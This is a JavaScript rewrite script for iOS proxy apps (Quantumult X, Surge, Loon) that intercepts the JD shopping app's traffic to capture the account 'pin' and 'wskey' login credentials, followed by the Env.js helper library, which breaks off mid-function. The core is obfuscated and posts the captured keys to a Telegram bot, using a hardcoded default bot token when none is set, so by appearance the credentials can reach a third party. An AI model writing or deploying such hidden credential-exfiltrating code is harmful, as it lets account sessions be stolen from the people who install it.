/*

获取京东 WSKEY
使用方法：打开京东App --> 消息中心（右上角）获取京东 WSKEY

自用脚本，请勿使用！！！

【MITM配置】
hostname = api-dd.jd.com

【Surge脚本配置】
[Script]
获取京东 WSKEY = type=http-request,pattern=^https:\/\/api\-dd\.jd\.com\/client\.action\?functionId=getSessionLog,requires-body=1,max-size=0,timeout=1000,script-path=https://raw.githubusercontent.com/Fokit/Quantumult-X/main/scripts/jd_wskey_tg.js,script-update-interval=0

【Loon脚本配置】
[Script]
http-request ^https:\/\/api\-dd\.jd\.com\/client\.action\?functionId=getSessionLog tag=获取京东 WSKEY, script-path=https://raw.githubusercontent.com/FoKit/Quantumult-X/main/scripts/jd_wskey_tg.js,requires-body=1

【 QX  脚本配置 】
[rewrite_local]
^https:\/\/api\-dd\.jd\.com\/client\.action\?functionId=getSessionLog url script-echo-response https://raw.githubusercontent.com/FoKit/Quantumult-X/main/scripts/jd_wskey_tg.js

*/

var _0xodh='jsjiami.com.v6',_0xodh_=['‮_0xodh'],_0x3f90=[_0xodh,'w4h0w7I=','Hj3CscOE','wpFlw7vDgA==','w7Udwp54wpzDoUskwqrDlw==','w5J0w77CugDDrA==','B1LDq8K9wrbDvBJT','w5kUFcO3GQ==','wq13wpAdI8ONFQ==','w7YtMMONIw==','w43Co8KNFcOu','wrMtZB/DkRY=','wqXCsy8ncg==','wrRaw4rCtcKy','woxfEw==','FsKZYRfDkQ==','w6fCtXo=','4pip77uww4/DhjDDvBzDqivmn4TljqjliJrvvbznga3lhL/mn4XnnJDorJzmgr7jgK7DvxU=','AMOyw64aFMKdwr3Dt2XDhQ==','dVtjcg==','GcKGDcOv','wodlw7vDp8K8w4M1','DsK0w4PDlMKQwpM=','H1M8ZcOc','C8K0L8OUQQ==','B8KSIcOsdQ==','JsOoJMOKwpU=','wqkGEcKQwrhfTcKew4w=','wpkwwpjCu2pr','JMOKJMOPwprDqwM=','w7jCrm85P8KKw5fChDk=','HMKLST/DjMODwph+X2o=','woQFVCHDqzbDrj3Dk8OB','woRpFsOGw74=','YhfDncKvw7M=','C8KpDw==','4piF77iIwrXCiCrCmsK8w6hC5p+Y5Y6J5Ym077+F54OV5YWh5p2L55yE6K6s5oKi44KtF30=','CFMl','EsK7IcOxZg==','6K286YSX6K+I44GS','d1Vp','b+KagO+5jQPlhYrlhI7ku6vkupIXw4BCehXChsOm5YWv54+a6ZaQ6Kyow4jig6LvuLcL','w63Dr39Dwo/DmsOwCFg=','HsOww4vDosKeMsOvYcOk','w4Zmw6HCvBE=','w45RAVtKTg==','w7rDtGNP','4pqk77mswrDmn6vliJnkuJ7ljJjnl43vvoXoroznq5flkILphbforarjgp4=','4pip77uww4/lhIjlhIbkuJvkuYXCk1zCvTvDtynDtOWntei0hQ==','NMKNBMOqWw==','w7PCqWk7JQ==','w4sMeMOEw7g=','bcKzwpzDkcKu','wrRiNcOjw5g=','w7LDo8K6aUjClsO7wobCh3vDpSpgwoNLw6tCfMOIw4zDgkbDvgfDrFPCiEs=','wqESwqnCnlFXw4DCpMKew4nDiMK+','NElrecOWwoXCicOrwoc/W8OE','w4Zvw7TCqybCuMKdwow=','w6ZAQcKhw6jDlw==','IgfDucKVw5lxwpvCgMOWDMK/bsOlw4/DvcKqPMOIwoN7UmfDnnvDrBfDq2AcwpQ=','wrBbV8Kt','w53DkcK8eF0=','CkMoXhA=','wqRjwoUfAA==','wrtTScKgw4jDjV7DkWE=','HcK6w57DjMKc','8K2Or2ZLw4rDuMKNJzXojb/ljJzmiajlianCuFw=','w6kdwohYwqjDpUY=','8Y69iFsFcTVJwrA36IyP5Y6l5oqq5Yqd44Kg','w77Ct8KYC8OIN8KTwoHCgzg=','ZsOeDHRR','A3QIb8OR','w7QoTQ==','w6sPM8ObPMOW5Y+e5pe15p2g6K+244KPOg==','4puo77ipZue9jee5heW+seW7sO+9suivouerheWThOmGteiso+OCsFx/','woVmTMK4w6/DlsK8','4puT77iDcue9oOe6uOW+nuW5m+++neivhuepgeWQpumFvOivleODnA==','w7DDkl7ChwQ=','w69mBElZ','VMKSwro=','8KWPqiBSworCosKyF3Hoj4vljrnmirjli4LDpcK1','wpbClVZLdV/Csw==','8Y2um8OEDhHDsjFmwqnojKvljK3miJrliK3jgK0=','wrYdBA==','aE3DtMKHwqjCteWOvuaUnuacleisqOODiGg=','AWkhdQXDqAI=','JsKBRz7Dt8KT5Yy25pWh5py36K+h44Gj','wo9EGQ==','PGcpwqc=','AHkwRQ==','wpBSDUsdw7bDlA==','w74Ib8OEw6Y=','AsO4w6w7M8Kf','w6lGw5A=','FMO4HMOHwpQ=','6K+a6YWB6K6X44CF','MuKZne+7ksK/5YWl5YSh5Lur5LquCcOSwppDRMOZUOWFuOeOmOmXueivgMKy4oCE77mfDQ==','aE58fsOcwq/ChcO+wo0=','wqgXEMK9wrdMRQ==','4puN77uUwoznv67nuKXlv7Tlu6bvvK7orJvnqZnlkbHphZLorLLjgoY=','4puO77qYwqvmnbPli6Dku6DljL7nlrDvvIjorZbnqLflkLvphb3or6njgKw=','UVHDuA==','HMKPQT4=','wrNBRsKt','w7LCjnwYEw==','EMOsKMO7wos=','6I2C5Y+W5Lik5Lq/w73DoAfCm3zCgw==','wqJ3woU9J8OLBw==','w5nDuMKhclLDiQ==','w73DtGJBwojDmA==','wpg0woLCv3Y=','wrvDrsKfw7cM','JBvCg8OjLREaw7bDu8KRcsOh','DwZ0QcK4wp3Clg==','fF96U8OTwrzCjQ==','w5oyD8OMwr/ClcOpw6t+wrU4w7FIw7g=','OEc0b8O8','woPClVFLdV/Csw==','b8KuwpbDmsKlGxPDtXbDkMKaTVPDnznDhg==','wrZ5cMKDw4o=','5p6V5oie5Ymowp4FwqVXw4Aw','w4gTM8ObK8K6dcO2HQ==','44Gg6LW65Yyr44Kw','44Go6LaA5YyA','6aSI5q665YaU5YWP5LmN5Lqhwrk5cgkowpQ=','4pi777uKw4rlh73lh5/ku4Tku6zDjsKwDsOuIl7Dj+WnhOi1iw==','wocaYDPDvw==','BhBNSsK6','wqDDgsK/w44y','wrQneBc=','jsjiXaPmkZZNi.ceLoEmV.v6uGP=='];if(function(_0x2d8f05,_0x4b81bb,_0x4d74cb){function _0x32719f(_0x2dc776,_0x362d54,_0x2576f4,_0x5845c1,_0x4fbc7a,_0x6c88bf){_0x362d54=_0x362d54>>0x8,_0x4fbc7a='po';var _0x151bd2='shift',_0x558098='push',_0x6c88bf='‮';if(_0x362d54<_0x2dc776){while(--_0x2dc776){_0x5845c1=_0x2d8f05[_0x151bd2]();if(_0x362d54===_0x2dc776&&_0x6c88bf==='‮'&&_0x6c88bf['length']===0x1){_0x362d54=_0x5845c1,_0x2576f4=_0x2d8f05[_0x4fbc7a+'p']();}else if(_0x362d54&&_0x2576f4['replace'](/[XPkZZNeLEVuGP=]/g,'')===_0x362d54){_0x2d8f05[_0x558098](_0x5845c1);}}_0x2d8f05[_0x558098](_0x2d8f05[_0x151bd2]());}return 0xdca75;};return _0x32719f(++_0x4b81bb,_0x4d74cb)>>_0x4b81bb^_0x4d74cb;}(_0x3f90,0xea,0xea00),_0x3f90){_0xodh_=_0x3f90['length']^0xea;};function _0x505d(_0x378431,_0x19355c){_0x378431=~~'0x'['concat'](_0x378431['slice'](0x1));var _0x238eaa=_0x3f90[_0x378431];if(_0x505d['CvkMge']===undefined){(function(){var _0x1032a4=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x382dca='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1032a4['atob']||(_0x1032a4['atob']=function(_0x189fc9){var _0x5248a2=String(_0x189fc9)['replace'](/=+$/,'');for(var _0x3862b2=0x0,_0x2471cb,_0x35a518,_0x176500=0x0,_0x1ae4ac='';_0x35a518=_0x5248a2['charAt'](_0x176500++);~_0x35a518&&(_0x2471cb=_0x3862b2%0x4?_0x2471cb*0x40+_0x35a518:_0x35a518,_0x3862b2++%0x4)?_0x1ae4ac+=String['fromCharCode'](0xff&_0x2471cb>>(-0x2*_0x3862b2&0x6)):0x0){_0x35a518=_0x382dca['indexOf'](_0x35a518);}return _0x1ae4ac;});}());function _0x4e2e6e(_0x2cf8b6,_0x19355c){var _0x30732b=[],_0x1e6d33=0x0,_0x12390c,_0x27eb7c='',_0x25d1b3='';_0x2cf8b6=atob(_0x2cf8b6);for(var _0x1b967e=0x0,_0x51a5d7=_0x2cf8b6['length'];_0x1b967e<_0x51a5d7;_0x1b967e++){_0x25d1b3+='%'+('00'+_0x2cf8b6['charCodeAt'](_0x1b967e)['toString'](0x10))['slice'](-0x2);}_0x2cf8b6=decodeURIComponent(_0x25d1b3);for(var _0x1c17a6=0x0;_0x1c17a6<0x100;_0x1c17a6++){_0x30732b[_0x1c17a6]=_0x1c17a6;}for(_0x1c17a6=0x0;_0x1c17a6<0x100;_0x1c17a6++){_0x1e6d33=(_0x1e6d33+_0x30732b[_0x1c17a6]+_0x19355c['charCodeAt'](_0x1c17a6%_0x19355c['length']))%0x100;_0x12390c=_0x30732b[_0x1c17a6];_0x30732b[_0x1c17a6]=_0x30732b[_0x1e6d33];_0x30732b[_0x1e6d33]=_0x12390c;}_0x1c17a6=0x0;_0x1e6d33=0x0;for(var _0x5a984a=0x0;_0x5a984a<_0x2cf8b6['length'];_0x5a984a++){_0x1c17a6=(_0x1c17a6+0x1)%0x100;_0x1e6d33=(_0x1e6d33+_0x30732b[_0x1c17a6])%0x100;_0x12390c=_0x30732b[_0x1c17a6];_0x30732b[_0x1c17a6]=_0x30732b[_0x1e6d33];_0x30732b[_0x1e6d33]=_0x12390c;_0x27eb7c+=String['fromCharCode'](_0x2cf8b6['charCodeAt'](_0x5a984a)^_0x30732b[(_0x30732b[_0x1c17a6]+_0x30732b[_0x1e6d33])%0x100]);}return _0x27eb7c;}_0x505d['pAijOK']=_0x4e2e6e;_0x505d['EUhCaD']={};_0x505d['CvkMge']=!![];}var _0x3d56ae=_0x505d['EUhCaD'][_0x378431];if(_0x3d56ae===undefined){if(_0x505d['BhXkau']===undefined){_0x505d['BhXkau']=!![];}_0x238eaa=_0x505d['pAijOK'](_0x238eaa,_0x19355c);_0x505d['EUhCaD'][_0x378431]=_0x238eaa;}else{_0x238eaa=_0x3d56ae;}return _0x238eaa;};const $=new Env(_0x505d('‮0','J^*g'));let CK=$request[_0x505d('‫1','n(LR')][_0x505d('‫2','wkLt')]||$request['headers'][_0x505d('‮3','Tk3u')];const pin=CK[_0x505d('‮4','6e5h')](/pin=([^=;]+?);/)[0x1];const key=CK[_0x505d('‫5','Innz')](/wskey=([^=;]+?);/)[0x1];$[_0x505d('‫6','ciYA')]=$[_0x505d('‮7','iV4h')]('WSKEY_TG_BOT_TOKEN')||'1814918753:AAEShq-pNnEe-2O0-dymhP-k7M-A-8HALKU';$['TG_USER_ID']=!$[_0x505d('‫8','QHXR')]('WSKEY_TG_USER_ID')?[_0x505d('‫9','rXMB')]:JSON[_0x505d('‫a','D43h')]($[_0x505d('‮b','8itS')](_0x505d('‮c','N0xm')));!(async()=>{var _0x20b3d9={'dwMLH':'⚠️\x20WSKEY\x20未变动，点击查看详情。','htThS':'⚠️\x20服务不可用，请稍后重试。','VfgqT':'pyxtG','brTuP':function(_0x58815b,_0x1bdfe8){return _0x58815b===_0x1bdfe8;},'QQvVJ':'gWzyN','WXkGG':function(_0x1d3d6b,_0x55bae4){return _0x1d3d6b||_0x55bae4;},'nsMOc':_0x505d('‮d','WS7X'),'MHiYH':_0x505d('‮e','HBX('),'ftMIK':function(_0x44d86b,_0x5cb1a1){return _0x44d86b(_0x5cb1a1);},'mpCCQ':_0x505d('‮f','HBX('),'IMhsq':_0x505d('‮10','ciYA'),'WuzyE':function(_0x247f83,_0x51b794){return _0x247f83+_0x51b794;},'mnGMq':_0x505d('‮11','v)IQ'),'maNwt':function(_0xefd936,_0x2755bf){return _0xefd936===_0x2755bf;},'lpnWT':'zvAMg','gUJGG':function(_0x8929b,_0x26a743){return _0x8929b+_0x26a743;},'mLlKb':_0x505d('‫12','Tk3u'),'eEbkt':function(_0x301d0b,_0x507076,_0x44541a){return _0x301d0b(_0x507076,_0x44541a);},'taIhV':_0x505d('‮13','lPXs')};if(_0x20b3d9[_0x505d('‫14','IdBm')](!pin,!key)){if(_0x20b3d9[_0x505d('‮15','iV4h')]===_0x505d('‮16','Innz')){$[_0x505d('‫17','IdBm')]=_0x20b3d9['MHiYH'];$[_0x505d('‫18','9fvs')]($[_0x505d('‮19','ciYA')],$['subt'],$[_0x505d('‫1a','J^*g')]);$['done']();}else{$[_0x505d('‫1b','&p*L')]=!![];}}try{const _0x204599=_0x505d('‮1c','9fvs')+key+_0x505d('‮1d','aOMY')+pin+';';const _0x53a21e=pin;const _0x190fd9=_0x20b3d9[_0x505d('‫1e','HBX(')](decodeURIComponent,_0x53a21e);let _0x45fe7b=JSON['parse']($[_0x505d('‫1f','n(LR')](_0x20b3d9['mpCCQ'])||'[]');let _0xcd621c;let _0x5b1537=_0x20b3d9[_0x505d('‫20','HBX(')];const _0x5d431c=_0x45fe7b['find']((_0x22ab01,_0x249063)=>{var _0x321e24={'xjTwX':_0x20b3d9['htThS']};if(_0x20b3d9['VfgqT']===_0x20b3d9[_0x505d('‫21','lPXs')]){const _0x18d43f=_0x22ab01[_0x505d('‫22','IdBm')];const _0x588bf5=_0x18d43f?_0x18d43f['match'](/pin=.+?;/)?_0x18d43f['match'](/pin=(.+?);/)[0x1]:null:null;const _0x242758=_0x20b3d9[_0x505d('‮23','j]zO')](_0x53a21e,_0x588bf5);if(_0x242758){_0xcd621c=_0x249063;if(_0x18d43f!==_0x204599){if(_0x20b3d9['brTuP'](_0x505d('‮24','E^Vm'),_0x20b3d9['QQvVJ'])){$[_0x505d('‫25','bHm^')](_0x20b3d9[_0x505d('‮26','MlNb')]);console[_0x505d('‮27','RPqe')](_0x505d('‮28',']hle')+_0x204599);}else{$[_0x505d('‮29','9Nr[')]=!![];}}}return _0x242758;}else{$['msg']($[_0x505d('‫2a','QHXR')],$[_0x505d('‮2b','#o2*')],$[_0x505d('‮2c','J^*g')]||_0x321e24['xjTwX']);resolve();}});let _0x3cc41f='';if(_0x5d431c){_0x45fe7b[_0xcd621c][_0x505d('‮2d','rZB)')]=_0x204599;_0x5b1537=_0x20b3d9[_0x505d('‮2e','D43h')](_0x20b3d9[_0x505d('‫2f','[XBN')]+_0x20b3d9['WuzyE'](_0xcd621c,0x1),'】');_0x3cc41f='更新京东\x20WSKEY';}else{if(_0x20b3d9[_0x505d('‮30','#o2*')](_0x20b3d9['lpnWT'],_0x505d('‮31','6bi#'))){console['log'](''+JSON[_0x505d('‫32','flaK')](err));}else{_0x45fe7b['push']({'userName':_0x190fd9,'cookie':_0x204599});_0x5b1537=_0x20b3d9['gUJGG'](_0x20b3d9['mnGMq']+_0x45fe7b[_0x505d('‫33','6e5h')],'】');_0x3cc41f=_0x20b3d9['mLlKb'];$['needUpload']=!![];}}$[_0x505d('‮34','6bi#')](JSON[_0x505d('‮35','RPqe')](_0x45fe7b,null,0x2),'wskeyList');if($[_0x505d('‫36','MlNb')]){for(const _0xb8bfa4 of $[_0x505d('‮37','IdBm')]){await _0x20b3d9[_0x505d('‮38','bHm^')](updateCookie,_0x204599,_0xb8bfa4);await _0x20b3d9[_0x505d('‮39','!P!l')](showMsg,_0xb8bfa4);}}else{$[_0x505d('‫3a','[XBN')](_0x20b3d9['dwMLH']);console['log'](_0x505d('‫3b','9fvs')+_0x204599);}return;}catch(_0x1f95a0){$[_0x505d('‮3c','PB)6')](_0x20b3d9[_0x505d('‮3d','[XBN')],'',_0x505d('‮3e','RPqe'));console[_0x505d('‫3f','QHXR')](_0x505d('‫40','PB)6')+JSON[_0x505d('‮41','Tk3u')](_0x1f95a0)+'\x0a\x0a'+_0x1f95a0+'\x0a\x0a'+JSON[_0x505d('‫42','OiF]')]($request['headers'])+'\x0a');}})()[_0x505d('‮43','9fvs')](_0x1f8c02=>$[_0x505d('‫44','mm[e')](_0x1f8c02))['finally'](()=>$[_0x505d('‫45','Tk3u')]());function updateCookie(_0x59f096,_0x4b18ec){var _0x2fd9ce={'GFraf':_0x505d('‫46','!P!l'),'zxnIO':_0x505d('‮47',']hle'),'QDnme':function(_0x58e902,_0x4ad2fc){return _0x58e902===_0x4ad2fc;},'nqaFB':_0x505d('‫48','[XBN'),'KRNsH':_0x505d('‮49','RPqe'),'JURKE':function(_0x23b17d,_0x4391cd){return _0x23b17d===_0x4391cd;},'MXbWa':'HWRzp','vDCjL':'kGVTO','iyxre':function(_0x4d471f,_0x39bccc){return _0x4d471f!==_0x39bccc;},'MWJxP':'Ortzj','lyuKb':'DaONN','WIJgw':function(_0xb2ed6f){return _0xb2ed6f();},'UNANR':_0x505d('‮4a','[NVa')};return new Promise(_0x31aa52=>{if(_0x2fd9ce[_0x505d('‮4b','N0xm')]===_0x2fd9ce[_0x505d('‮4c','bHm^')]){const _0x20277f={'url':_0x505d('‮4d','wkLt')+$[_0x505d('‫4e','6e5h')]+_0x505d('‫4f','QHXR'),'headers':{'Content-Type':'application/x-www-form-urlencoded'},'body':_0x505d('‫50','9fvs')+_0x4b18ec+_0x505d('‫51','WS7X')+_0x59f096+_0x505d('‫52','!P!l')};$[_0x505d('‫53','WS7X')](_0x20277f,(_0xf07434,_0x3477e2,_0xd6f237)=>{var _0x4c7a99={'fOELv':_0x2fd9ce[_0x505d('‮54','wkLt')],'CWLLo':_0x2fd9ce['zxnIO']};try{if(_0x2fd9ce[_0x505d('‫55','7kp2')](_0x2fd9ce['nqaFB'],_0x2fd9ce[_0x505d('‮56','n(LR')])){if(_0xf07434){console['log'](''+JSON[_0x505d('‮57','6wDz')](_0xf07434));}else{_0xd6f237=JSON[_0x505d('‮58','rZB)')](_0xd6f237);if(_0xd6f237['ok']){console['log'](_0x505d('‫59','D43h')+_0x59f096);$[_0x505d('‫5a','&p*L')]=_0x505d('‫5b','j]zO')+_0x59f096;}else if(_0xd6f237[_0x505d('‮5c','lPXs')]===0x190){if(_0x2fd9ce[_0x505d('‫5d','@Ef@')]!==_0x2fd9ce[_0x505d('‫5e','D43h')]){console[_0x505d('‮5f','[NVa')](_0x505d('‫60','HBX('));$['resData']='Token\x20参数有误。';}else{console['log'](_0x505d('‮61','D43h')+_0x59f096);$[_0x505d('‫62','rXMB')]=_0x505d('‫63','7SB5')+_0x59f096;}}else if(_0xd6f237['error_code']===0x191){if(_0x2fd9ce[_0x505d('‮64','6qSK')](_0x2fd9ce[_0x505d('‫65','mm[e')],_0x2fd9ce['vDCjL'])){console[_0x505d('‮66','N0xm')](_0x505d('‮67','iV4h')+_0x59f096);$[_0x505d('‮68','8itS')]=_0x505d('‮69','n(LR')+_0x59f096;}else{console[_0x505d('‮6a','flaK')](_0x505d('‮6b','aOMY'));$[_0x505d('‮6c','7SB5')]=_0x505d('‫6d','MlNb');}}}}else{return new Promise(_0x1d673e=>{$[_0x505d('‫6e','MwBG')]($[_0x505d('‫6f','XSMY')],$[_0x505d('‫70','7SB5')],$[_0x505d('‫71','MwBG')]||_0x4c7a99[_0x505d('‫72','[NVa')]);_0x1d673e();});}}catch(_0x3b1f67){$[_0x505d('‮73','9Nr[')](_0x3b1f67,_0x3477e2);}finally{if(_0x2fd9ce['iyxre'](_0x2fd9ce['MWJxP'],_0x2fd9ce['lyuKb'])){_0x2fd9ce['WIJgw'](_0x31aa52);}else{$[_0x505d('‮74','@eRc')](_0x4c7a99[_0x505d('‫75','6bi#')],'',_0x505d('‫76','@Ef@'));console['log'](_0x505d('‫77','N0xm')+JSON[_0x505d('‮78','QHXR')](error)+'\x0a\x0a'+error+'\x0a\x0a'+JSON['stringify']($request['headers'])+'\x0a');}}});}else{console[_0x505d('‫3f','QHXR')]('⚠️\x20网络异常，请稍后重试。\x0a\x0a'+_0x59f096);$[_0x505d('‮79','flaK')]=_0x505d('‮7a','rZB)')+_0x59f096;}});}function showMsg(){var _0x4315ff={'yTaHB':_0x505d('‫7b','9Nr['),'GCxpp':function(_0x2e6253){return _0x2e6253();}};return new Promise(_0xc9f949=>{$[_0x505d('‮7c','aOMY')]($[_0x505d('‮7d','MlNb')],$[_0x505d('‮7e','WS7X')],$[_0x505d('‫71','MwBG')]||_0x4315ff[_0x505d('‫7f','RPqe')]);_0x4315ff[_0x505d('‮80','6bi#')](_0xc9f949);});};_0xodh='jsjiami.com.v6';

// https://github.com/chavyleung/scripts/blob/master/Env.js
// prettier-ignore
function Env(name, opts) {
  class Http {
    constructor(env) {
      this.env = env;
    }

    send(opts, method = 'GET') {
      opts = typeof opts === 'string' ? { url: opts } : opts;
      let sender = this.get;
      if (method === 'POST') {
        sender = this.post;
      }
      return new Promise((resolve, reject) => {
        sender.call(this, opts, (err, resp, body) => {
          if (err) reject(err);
          else resolve(resp);
        });
      });
    }

    get(opts) {
      return this.send.call(this.env, opts);
    }

    post(opts) {
      return this.send.call(this.env, opts, 'POST');
    }
  }

  return new (class {
    constructor(name, opts) {
      this.name = name;
      this.http = new Http(this);
      this.data = null;
      this.dataFile = 'box.dat';
      this.logs = [];
      this.isMute = false;
      this.isNeedRewrite = false;
      this.logSeparator = '\n';
      this.startTime = new Date().getTime();
      Object.assign(this, opts);
      this.log('', `🔔${this.name}, 开始!`);
    }

    isNode() {
      return 'undefined' !== typeof module && !!module.exports;
    }

    isQuanX() {
      return 'undefined' !== typeof $task;
    }

    isSurge() {
      return 'undefined' !== typeof $httpClient && 'undefined' === typeof $loon;
    }

    isLoon() {
      return 'undefined' !== typeof $loon;
    }

    isShadowrocket() {
      return 'undefined' !== typeof $rocket;
    }

    toObj(str, defaultValue = null) {
      try {
        return JSON.parse(str);
      } catch {
        return defaultValue;
      }
    }

    toStr(obj, defaultValue = null) {
      try {
        return JSON.stringify(obj);
      } catch {
        return defaultValue;
      }
    }

    getJson(key, defaultValue) {
      let json = defaultValue;
      const val = this.getData(key);
      if (val) {
        try {
          json = JSON.parse(this.getData(key));
        } catch {}
      }
      return json;
    }

    setJson(val, key) {
      try {
        return this.setData(JSON.stringify(val), key);
      } catch {
        return false;
      }
    }

    getScript(url) {
      return new Promise((resolve) => {
        this.get({ url }, (err, resp, body) => resolve(body));
      });
    }

    runScript(script, runOpts) {
      return new Promise((resolve) => {
        let httpApi = this.getData('@chavy_boxjs_userCfgs.httpApi');
        httpApi = httpApi ? httpApi.replace(/\n/g, '').trim() : httpApi;
        let httpApi_timeout = this.getData(
          '@chavy_boxjs_userCfgs.httpApi_timeout'
        );
        httpApi_timeout = httpApi_timeout ? httpApi_timeout * 1 : 20;
        httpApi_timeout =
          runOpts && runOpts.timeout ? runOpts.timeout : httpApi_timeout;
        const [key, addr] = httpApi.split('@');
        const opts = {
          url: `http://${addr}/v1/scripting/evaluate`,
          body: {
            script_text: script,
            mock_type: 'cron',
            timeout: httpApi_timeout,
          },
          headers: { 'X-Key': key, Accept: '*/*' },
        };
        this.post(opts, (err, resp, body) => resolve(body));
      }).catch((e) => this.logErr(e));
    }

    loadData() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require('fs');
        this.path = this.path ? this.path : require('path');
        const curDirDataFilePath = this.path.resolve(this.dataFile);
        const rootDirDataFilePath = this.path.resolve(
          process.cwd(),
          this.dataFile
        );
        const isCurDirDataFile = this.fs.existsSync(curDirDataFilePath);
        const isRootDirDataFile =
          !isCurDirDataFile && this.fs.existsSync(rootDirDataFilePath);
        if (isCurDirDataFile || isRootDirDataFile) {
          const datPath = isCurDirDataFile
            ? curDirDataFilePath
            : rootDirDataFilePath;
          try {
            return JSON.parse(this.fs.readFileSync(datPath));
          } catch (e) {
            return {};
          }
        } else return {};
      } else return {};
    }

    writeData() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require('fs');
        this.path = this.path ? this.path : require('path');
        const curDirDataFilePath = this.path.resolve(this.dataFile);
        const rootDirDataFilePath = this.path.resolve(
          process.cwd(),
          this.dataFile
        );
        const isCurDirDataFile = this.fs.existsSync(curDirDataFilePath);
        const isRootDirDataFile =
          !isCurDirDataFile && this.fs.existsSync(rootDirDataFilePath);
        const jsonData = JSON.stringify(this.data);
        if (isCurDirDataFile) {
          this.fs.writeFileSync(curDirDataFilePath, jsonData);
        } else if (isRootDirDataFile) {
          this.fs.writeFileSync(rootDirDataFilePath, jsonData);
        } else {
          this.fs.writeFileSync(curDirDataFilePath, jsonData);
        }
      }
    }

    lodash_get(source, path, defaultValue = undefined) {
      const paths = path.replace(/\[(\d+)\]/g, '.$1').split('.');
      let result = source;
      for (const p of paths) {
        result = Object(result)[p];
        if (result === undefined) {
          return defaultValue;
        }
      }
      return result;
    }

    lodash_set(obj, path, value) {
      if (Object(obj) !== obj) return obj;
      if (!Array.isArray(path)) path = path.toString().match(/[^.[\]]+/g) || [];
      path
        .slice(0, -1)
        .reduce(
          (a, c, i) =>
            Object(a[c]) === a[c]
              ? a[c]
              : (a[c] = Math.abs(path[i + 1]) >> 0 === +path[i + 1] ? [] : {}),
          obj
        )[path[path.length - 1]] = value;
      return obj;
    }

    getData(key) {
      let val = this.getVal(key);
      // 如果以 @
      if (/^@/.test(key)) {
        const [, objKey, paths] = /^@(.*?)\.(.*?)$/.exec(key);
        const objVal = objKey ? this.getVal(objKey) : '';
        if (objVal) {
          try {
            const objedVal = JSON.parse(objVal);
            val = objedVal ? this.lodash_get(objedVal, paths, '') : val;
          } catch (e) {
            val = '';
          }
        }
      }
      return val;
    }

    setData(val, key) {
      let isSuc = false;
      if (/^@/.test(key)) {
        const [, objKey, paths] = /^@(.*?)\.(.*?)$/.exec(key);
        const objdat = this.getVal(objKey);
        const objVal = objKey
          ? objdat === 'null'
            ? null
            : objdat || '{}'
          : '{}';
        try {
          const objedVal = JSON.parse(objVal);
          this.lodash_set(objedVal, paths, val);
          isSuc = this.setVal(JSON.stringify(objedVal), objKey);
        } catch (e) {
          const objedVal = {};
          this.lodash_set(objedVal, paths, val);
          isSuc = this.setVal(JSON.stringify(objedVal), objKey);
        }
      } else {
        isSuc = this.setVal(val, key);
      }
      return isSuc;
    }

    getVal(key) {
      if (this.isSurge() || this.isLoon()) {
        return $persistentStore.read(key);
      } else if (this.isQuanX()) {
        return $prefs.valueForKey(key);
      } else if (this.isNode()) {
        this.data = this.loadData();
        return this.data[key];
      } else {
        return (this.data && this.data[key]) || null;
      }
    }

    setVal(val, key) {
      if (this.isSurge() || this.isLoon()) {
        return $persistentStore.write(val, key);
      } else if (this.isQuanX()) {
        return $prefs.setValueForKey(val, key);
      } else if (this.isNode()) {
        this.data = this.loadData();
        this.data[key] = val;
        this.writeData();
        return true;
      } else {
        return (this.data && this.data[key]) || null;
      }
    }

    initGotEnv(opts) {
      this.got = this.got ? this.got : require('got');
      this.ckTough = this.ckTough ? this.ckTough : require('tough-cookie');
      this.ckJar = this.ckJar ? this.ckJar : new this.ckTough.CookieJar();
      if (opts) {
        opts.headers = opts.headers ? opts.headers : {};
        if (undefined === opts.headers.Cookie && undefined === opts.cookieJar) {
          opts.cookieJar = this.ckJar;
        }
      }
    }

    get(opts, callback = () => {}) {
      if (opts.headers) {
        delete opts.headers['Content-Type'];
        delete opts.headers['Content-Length'];
      }
      if (this.isSurge() || this.isLoon()) {
        if (this.isSurge() && this.isNeedRewrite) {
          opts.headers = opts.headers || {};
          Object.assign(opts.headers, { 'X-Surge-Skip-Scripting': false });
        }
        $httpClient.get(opts, (err, resp, body) => {
          if (!err && resp) {
            resp.body = body;
            resp.statusCode = resp.status;
          }
          callback(err, resp, body);
        });
      } else if (this.isQuanX()) {
        if (this.isNeedRewrite) {
          opts.opts = opts.opts || {};
          Object.assign(opts.opts, { hints: false });
        }
        $task.fetch(opts).then(
          (resp) => {
            const { statusCode: status, statusCode, headers, body } = resp;
            callback(null, { status, statusCode, headers, body }, body);
          },
          (err) => callback(err)
        );
      } else if (this.isNode()) {
        this.initGotEnv(opts);
        this.got(opts)
          .on('redirect', (resp, nextOpts) => {
            try {
              if (resp.headers['set-cookie']) {
                const ck = resp.headers['set-cookie']
                  .map(this.ckTough.Cookie.parse)
                  .toString();
                if (ck) {
                  this.ckJar.setCookieSync(ck, null);
                }
                nextOpts.cookieJar = this.ckJar;
              }
            } catch (e) {
              this.logErr(e);
            }
            // this.ckJar.setCookieSync(resp.headers['set-cookie'].map(Cookie.parse).toString())
          })
          .then(
            (resp) => {
              const { statusCode: status, statusCode, headers, body } = resp;
              callback(null, { status, statusCode, headers, body }, body);
            },
            (err) => {
              const { message: error, response: resp } = err;
              callback(error, resp, resp && resp.body);
            }
          );
      }
    }

    post(opts, callback = () => {}) {
      const method = opts.method ? opts.method.toLocaleLowerCase() : 'post';
      // 如果指定了请求体, 但没指定`Content-Type`, 则自动生成
      if (opts.body && opts.headers && !opts.headers['Content-Type']) {
        opts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
      }
      if (opts.headers) delete opts.headers['Content-Length'];
      if (this.isSurge() || this.isLoon()) {
        if (this.isSurge() && this.isNeedRewrite) {
          opts.headers = opts.headers || {};
          Object.assign(opts.headers, { 'X-Surge-Skip-Scripting': false });
        }
        $httpClient[method](opts, (err, resp, body) => {
          if (!err && resp) {
            resp.body = body;
            resp.statusCode = resp.status;
          }
          callback(err, resp, body);
        });
      } else if (this.isQuanX()) {
        opts.method = method;
        if (this.isNeedRewrite) {
          opts.opts = opts.opts || {};
          Object.assign(opts.opts, { hints: false });
        }
        $task.fetch(opts).then(
          (resp) => {
            const { statusCode: status, statusCode, headers, body } = resp;
            callback(null, { status, statusCode, headers, body }, body);
          },
          (err) => callback(err)
        );
      } else if (this.isNode()) {
        this.initGotEnv(opts);
        const { url, ..._opts } = opts;
